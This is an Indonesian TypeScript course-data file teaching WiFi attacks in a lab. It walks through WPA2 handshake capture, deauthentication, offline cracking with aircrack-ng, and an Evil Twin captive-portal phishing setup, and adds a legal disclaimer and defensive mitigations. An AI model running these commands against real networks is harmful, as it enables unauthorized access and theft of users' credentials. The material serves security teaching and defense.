    caraKerja: '1) **Monitor mode**: attacker set WiFi adapter ke mode monitor untuk capture semua packet over-the-air.\n\n2) **Handshake capture**: di WPA2, butuh tangkap "4-way handshake" (4 packet yang dipertukarkan saat device connect ke AP). Ini hanya terjadi saat device BARU connect atau keluar-masuk.\n\n3) **Deauth attack**: untuk paksa client reconnect (trigger handshake ulang), kirim frame deauth broadcasted. Client disconnect → auto reconnect → handshake tertangkap.\n\n4) **Crack offline**: dengan handshake dalam file .cap, crack password tanpa perlu internet lagi. Tool: aircrack-ng + wordlist rockyou.txt.\n\n5) **Evil Twin**: clone SSID WiFi target → setup AP palsu dengan sinyal lebih kuat → victim auto connect → MITM traffic.',
    asciiDiagram: "AIRODUMP CAPTURE:\n[ WiFi router ] -----4-way handshake-----> [ Victim HP ]\n       ^                                       ^\n       |  (over the air)                       |\n[ Attacker PC + WiFi adapter monitor mode ]\n   capture semua packet\n   save to handshake.cap\n\nCRACKING OFFLINE:\n[ handshake.cap ] + [ rockyou.txt ] --aircrack-ng--> [ PASSWORD FOUND ]",
    senjata: {
      pc: '**Kali Linux** (recommended, sudah include semua tools). WiFi adapter support monitor mode + packet injection (misal Alfa AWUS036ACH atau TP-Link TL-WN722N v1). Tools: airodump-ng, aircrack-ng, aireplay-ng, wifite, fluxion.',
      hp: 'Termux + (rooted) + tools WiFi attack sangat terbatas di HP. Mayoritas WiFi attack butuh dedicated adapter monitor mode. HP cukup untuk baca konsep.',
    },
    metode: [
      {
        nama: 'Metode 1: Setup Lab WiFi Attack dengan Adapter (Pemula)',
        level: 'pemula',
        deskripsi: 'Untuk attack WiFi asli, butuh USB adapter yang support monitor mode + packet injection. Built-in WiFi laptop sering tidak cukup.',
        prasyarat: [
          'Kali Linux (live USB atau VM)',
          'USB WiFi adapter support monitor mode (Alfa AWUS036ACH, TL-WN722N v1, Ralink adapter)',
          'Router WiFi lab dengan SSID + WPA2 password',
          'Device victim (HP kedua yang terkoneksi ke WiFi lab)',
        ],
        langkah: [
          {
            judul: '⚠️ Disclaimer hukum WiFi hacking',
            aksi: 'WiFi hacking ke jaringan BUKAN milik Anda = ilegal (UU ITE). Lab ini hanya untuk:\n- WiFi lab pribadi (router Anda sendiri, semua client知情)\n- Target lab dengan izin tertulis\n- WiFi yang memang didirikan untuk edukasi\n\nCrack WiFi tetangga / kantor = PIDANA + Anda bisa dituntut ganti rugi.',
            catatan: 'Pelanggaran hukum = pidana.',
          },
          {
            judul: 'Setup Kali Linux dengan WiFi adapter',
            aksi: 'Kalian download Kali Linux ISO dari kali.org, buat bootable USB dengan Rufus (Windows) / Etcher (Mac/Linux). Boot dari USB ke laptop.\n\nSaat boot, colok USB WiFi adapter (yang support monitor mode, misal Alfa AWUS036ACH). Kali auto-detect. Cek dengan `iwconfig` — seharusnya muncul `wlan1` (selain wlan0 built-in).',
            expected: 'Kali Linux bootable, USB adapter terdeteksi (wlan1/wlan2).',
          },
          {
            judul: 'Verify adapter support monitor mode',
            aksi: 'Sebelum mulai, verify adapter support monitor mode + injection: jalankan `airmon-ng check kill` (stop processes yang interfere), lalu `airmon-ng start wlan1`. Cek: `iwconfig` — interface `wlan1mon` muncul. Kalau muncul → adapter OK.\n\nTest injection: `aireplay-ng -9 wlan1mon`. Output "Injection working!" kalau berhasil.',
            command: 'sudo airmon-ng check kill\nsudo airmon-ng start wlan1\nsudo aireplay-ng -9 wlan1mon',
            expected: 'wlan1mon muncul. Injection working!.',
          },
          {
            judul: 'Scan semua WiFi di sekitar',
            aksi: 'Sekarang scan WiFi: `sudo airodump-ng wlan1mon`. Akan muncul tabel dengan BSSID, PWR (sinyal), CH (channel), ENC (encryption: WPA2/WPA), ESSID (nama WiFi). Pilih target — catat BSSID dan channel-nya. Tekan Ctrl+C untuk keluar.',
            command: 'sudo airodump-ng wlan1mon',
            expected: 'Daftar WiFi di sekitar muncul. Pilih target lab Anda.',
          },
        ],
        outputAkhir: 'Setup WiFi attack lab selesai. Adapter ready di monitor mode.',
        kesalahanUmum: [
          {
            masalah: '❌ Adapter tidak terdeteksi',
            solusi: 'Adapter tidak support Kali / tidak punya chipset monitor mode (misal banyak Intel internal). Beli adapter khusus (Alfa, TP-Link TL-WN722N v1).',
          },
          {
            masalah: '❌ Monitor mode gagal start',
            solusi: 'Driver issue. Coba `sudo airmon-ng check kill` lagi. Atau pakai driver alternatif (apt install realtek-rtl88xxau-dkms).',
          },
          {
            masalah: '❌ "Injection not working"',
            solusi: 'Adapter chipset tidak support injection. Chipset yang OK: Atheros AR9271, Ralink RT3070, Realtek 8812AU.',
          },
        ],
      },
      {
        nama: 'Metode 2: Capture WPA2 Handshake + Crack (Menengah)',
        level: 'menengah',
        deskripsi: 'Tahap penting: capture 4-way handshake, lalu crack password offline. Tool: airodump-ng + aircrack-ng + dictionary attack.',
        prasyarat: [
          'Adapter monitor mode OK',
          'SSID target lab + channel + BSSID',
          'Wordlist rockyou.txt',
          'HP kedua yang terkoneksi ke WiFi target (untuk trigger handshake)',
        ],
        langkah: [
          {
            judul: 'Capture handshake dengan airodump-ng',
            aksi: 'Kalian di Kali. Mulai capture di channel BSSID target: `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan1mon`. Ganti `-c 6` dengan channel target, `AA:BB:CC:DD:EE:FF` dengan BSSID target, `-w handshake` adalah prefix file output. Akan muncul station list di bawah — saat ada station yang terkoneksi.',
            command: 'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan1mon',
            expected: 'Airodump mulai capture. Lihat station list.',
          },
          {
            judul: 'Trigger handshake dengan deauth',
            aksi: 'Karena handshake hanya terjadi saat device BARU connect, kita trigger dengan kirim frame deauth. Buka terminal kedua: `sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c STATION_MAC wlan1mon`. `-0 5` = deauth attack 5 kali. `-a` BSSID target, `-c` MAC station victim.\n\nSetelah 5 deauth, victim auto reconnect → handshake tertangkap. Balik ke terminal airodump, lihat pojok kanan ATAS: `WPA handshake: AA:BB:CC:DD:EE:FF` 🎉',
            command: 'sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c STATION_MAC wlan1mon',
            expected: 'Di terminal airodump: "WPA handshake: AA:BB:CC:DD:EE:FF" muncul.',
          },
          {
            judul: 'Crack password dengan aircrack-ng + rockyou',
            aksi: 'Stop airodump (Ctrl+C). Sekarang crack file handshake.cca p yg dihasilkan (biasanya `-01.cap`): `sudo aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt`. Tunggu — sampai ada yang cocok. Kalau password sederhana (misal `password123`), akan crack dalam detik sampai menit.',
            command: 'sudo aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt',
            expected: 'KEY FOUND! [ password123 ]',
          },
          {
            judul: 'Lihat hasil + cleanup',
            aksi: 'Setelah ketemu key, stop aircrack-ng. Anda sekarang punya password WiFi target — di lab pribadi, ini artinya Anda bisa connect (kalau tidak ada MAC filtering). Stop monitor mode: `sudo airmon-ng stop wlan1mon`. Restart NetworkManager: `sudo systemctl start NetworkManager`.',
            expected: 'Stop monitor mode. Network bersih kembali.',
          },
        ],
        outputAkhir: 'Berhasil capture WPA2 handshake + crack password WPA2 lab pribadi pakai dictionary attack.',
        kesalahanUmum: [
          {
            masalah: '❌ Handshake tidak tertangkap',
            solusi: 'Deauth lebih sering (-0 20 atau 50). Pastikan station MAC benar. Coba beberapa station jika banyak device konek.',
          },
          {
            masalah: '❌ aircrack-ng bilang "0 handshakes" atau tidak detect',
            solusi: 'File .cap mungkin bukan WPA2 handshake tapi hanya probe request. Cek dengan `sudo wireshark handshake-01.cap` → filter `eapol`. Harus ada 4 paket EAPOL.',
          },
          {
            masalah: '❌ Password tidak pernah ketemu setelah 1 jam',
            solusi: 'Password tidak ada di rockyou.txt. Coba wordlist lain: weakpass, SecLists, atau hybrid attack (dict + mask).',
          },
        ],
      },
      {
        nama: 'Metode 3: Evil Twin - WiFi Honeypot Attack (Lanjut)',
        level: 'lanjut',
        deskripsi: 'Evil Twin: clone SSID WiFi target, buat AP palsu dengan sinyal lebih kuat. Victim auto connect ke attacker (atau setelah Internet hilang, mereka konek ke twin).',
        prasyarat: [
          'Adapter WiFi dengan AP mode (hostapd support)',
          'Tool: hostapd + dnsmasq + fluxion / wifiphisher otomatis',
        ],
        langkah: [
          {
            judul: 'Setup hostapd dengan SSID clone',
            aksi: 'Buat file `/etc/hostapd/hostapd.conf`:\n```\ninterface=wlan1\ndriver=nl80211\nssid=NamaWiFiTarget\nhw_mode=g\nchannel=6\nwpa=2\nwpa_passphrase=evil123\n```\n\nStart: `sudo hostapd /etc/hostapd/hostapd.conf`. WiFi twin Anda sekarang aktif dengan SSID yang sama persis dengan target.',
            command: 'sudo hostapd /etc/hostapd/hostapd.conf',
            expected: 'AP mode active. SSID clone terlihat di device victim.',
          },
          {
            judul: 'Setup DHCP + DNS via dnsmasq',
            aksi: 'Victim konek ke twin Anda akan dapat IP dari subnet Anda. Setup DHCP/DNS: buat `/etc/dnsmasq.conf`:\n```\ninterface=wlan1\ndhcp-range=192.168.10.2,192.168.10.250,12h\ndhcp-option=3,192.168.10.1\ndhcp-option=6,192.168.10.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\n```\n\nStart: `sudo dnsmasq -C /etc/dnsmasq.conf -d`.',
            command: 'sudo dnsmasq -C /etc/dnsmasq.conf -d',
            expected: 'DHCP server berjalan. Victim dapat IP saat konek ke twin.',
          },
          {
            judul: 'Set IP forwarding + False DNS',
            aksi: 'Setup forwarding victim ke internet lewat attacker: `echo 1 > /proc/sys/net/ipv4/ip_forward`. Setup DNS redirect agar login page target Facebook muncul di captive portal: pakai tool fluxion / wifiphisher (otomatis setup phishing page + captive portal).',
            command: 'echo 1 > /proc/sys/net/ipv4/ip_forward',
            expected: 'IP forwarding aktif.',
          },
          {
            judul: 'Jalankan wifiphisher / fluxion otomatis',
            aksi: 'Cara otomatis: install `sudo apt install wifiphisher` (juga fluxion dari github). Pilih target SSID + WPA2 handshake capture + deauth otomatis. Wifiphisher akan setup twin + captive portal + banyak template phish: "WiFi perlu login ulang", "Update firmware", dll.\n\nSaat victim buka browser ke WiFi captive portal, attacker capture kredensial.',
          },
        ],
        outputAkhir: 'Berhasil setup Evil Twin WiFi honeypot. Capture kredensial victim via captive portal.',
        kesalahanUmum: [
          {
            masalah: '❌ hostapd "driver nl80211 not found"',
            solusi: 'Adapter tidak support AP mode. Beli adapter yang punya dual mode (monitor + AP): Atheros AR9271, Ralink RT3572.',
          },
          {
            masalah: '❌ Victim konek ke twin tapi tidak ada internet',
            solusi: 'Pastikan IP forwarding aktif + iptables NAT config: `sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`.',
          },
          {
            masalah: '❌ Victim auto-konek balik ke AP asli',
            solusi: 'Sinyal twin Anda harus lebih kuat. Taruh dekat victim. Atau lakukan deauth di twin (siapa klien deauth dari asli, akan coba hubung twin).',
          },
        ],
      },
    ],
    mitigasi: 'Pertahanan WiFi:\n\n**1. WPA3 (jika router support)**: SAE protocol lebih tahan dictionary attack. Tidak bisa di-crack offline seperti WPA2.\n\n**2. Passphrase kuat**: minimal 12-16 karakter random. Hindari kata-kata dari dictionary.\n\n**3. Disable WPS**: WPS (WiFi Protected Setup) punya bug yang bisa crack PIN-nya. Disable di router.\n\n**4. Hidden SSID (opsional, tidak sepenuhnya membantu)**: SSID tidak broadcast = perlu tahu nama dulu. Tapi masih bisa di-sniff dari probe request client.\n\n**5. MAC filtering**: hanya allow device tertentu. Tapi MAC bisa di-spoof.\n\n**6. 802.1X authentication**: enterprise-grade auth (RADIUS + per-user credential). Bukan untuk rumah; untuk kantor.\n\n**7. Monitor mode detection**: tools seperti Kismet detect aktivitas monitor mode abnormal.\n\n**8. Update firmware router**: vendor release patch untuk vulnerability baru.',
    latihan: [
      '🔰 Setup WiFi lab sendiri + capture handshake + crack dengan password yang ada di rockyou.txt.',
      '🔰 Pelajari WPA3 vs WPA2 bedanya teknis — apa itu SAE dragonfly handshake?',
      '🟡 Setup Evil Twin di lab sendiri dengan tool fluxion — capture kredensial Captive Portal.',
      '🟡 Bandingkan 5 router lab berbeda: WPS enabled / passphrase complexity / 802.1X support.',
      '🔴 Pelajari KRACK attack (CVE-2017-13077..13082) — replay attack di 4-way handshake. Apakah router Anda vulnerable?',
    ],
    faq: [
      { q: 'Apakah WPA2 masih aman di 2024?', a: 'Untuk passphrase sandang panjang random, masih aman. passphrase lemah (nama, tanggal lahir) bisa cracked dalam hitungan menit. WPA3 lebih baik.' },
      { q: 'Bagaimana cara cek apakah router saya vulnerable?', a: 'Cek firmware update. Cek apakah WPS enabled. Coba sendiri crack passphrase — kalau kena, ganti dengan lebih sandang.' },
      { q: 'Apakah hidden SSID menambah keamanan?', a: 'Sedikit — attacker masih bisa dapat SSID dari probe request client. Tidak menggantikan passphrase kuat.' },
      { q: 'Apakah WiFi attack via HP bisa?', a: 'Sangat terbatas. Beberapa HP Android punya fitur monitor mode di custom ROM, tapi sebagaian besar tidak. Lebih baik pakai PC + adapter dedicated.' },
    ],
    ringkasan: [
      'WEP = crackable dalam 60 detik. Jangan pakai!',
      'WPA2 = kuat tapi rentan dictionary attack',
      'WPA3 = lebih aman dengan SAE protocol',
      '4-way handshake = target utama capture',
      'Deauth attack untuk paksa handshake',
      'Tool wajib: airodump-ng, aircrack-ng, aireplay-ng, wifiphisher',
      'Adapter wajib: support monitor + injection',
    ],
    materiRelated: ['MITM', 'Network Segmentation', 'Enkripsi & Keamanan Data', 'Physical Security'],
  } as MateriData,
];

export default seranganNetwork;
